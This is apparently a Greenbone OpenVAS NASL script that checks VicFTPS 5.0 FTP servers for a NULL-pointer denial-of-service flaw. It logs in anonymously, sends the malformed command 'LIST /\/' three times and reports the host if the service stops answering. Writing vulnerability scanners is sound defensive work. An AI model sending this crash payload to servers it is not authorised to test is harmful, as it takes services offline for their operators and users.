# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900580");
  script_version("2025-07-29T05:44:59+0000");
  script_tag(name:"last_modification", value:"2025-07-29 05:44:59 +0000 (Tue, 29 Jul 2025)");
  script_tag(name:"creation_date", value:"2009-06-26 07:55:21 +0200 (Fri, 26 Jun 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2008-6829", "CVE-2008-2031");
  script_name("VicFTPS LIST Command Denial of Service Vulnerability");
  script_xref(name:"URL", value:"http://milw0rm.com/exploits/6834");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/28967");
  script_xref(name:"URL", value:"http://secunia.com/advisories/29943");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "os_detection.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/vicftps/detected", "Host/runs_windows");

  script_tag(name:"impact", value:"Successful exploitation allows attackers to execute arbitrary
  code, and can crash the affected application.");

  script_tag(name:"affected", value:"VicFTPS Version 5.0 and prior on Windows.");

  script_tag(name:"insight", value:"A NULL pointer dereference error exists while processing
  malformed arguments passed to a LIST command that starts with a '/\/' (forward
  slash, backward slash, forward slash).");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"VicFTPS FTP Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("port_service_func.inc");

vicPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:vicPort);
if(!banner || "VicFTPS" >!< banner)
  exit(0);

soc = open_sock_tcp(vicPort);
if(!soc)
  exit(0);

if(!ftp_authenticate(socket:soc, user:"anonymous", pass:"anonymous"))
  exit(0);

for(i = 0; i < 3; i++)
{
  cmd = "LIST /\/";
  ftp_send_cmd(socket:soc, cmd:cmd);
  sleep(5);
  ftp_close(socket:soc);

  soc = open_sock_tcp(vicPort);
  if(!soc) {
     security_message(port:vicPort);
     exit(0);
  } else {
    if(!ftp_authenticate(socket:soc, user:"anonymous", pass:"anonymous")) {
      security_message(port:vicPort);
      exit(0);
    }
    ftp_close(socket:soc);
  }
}
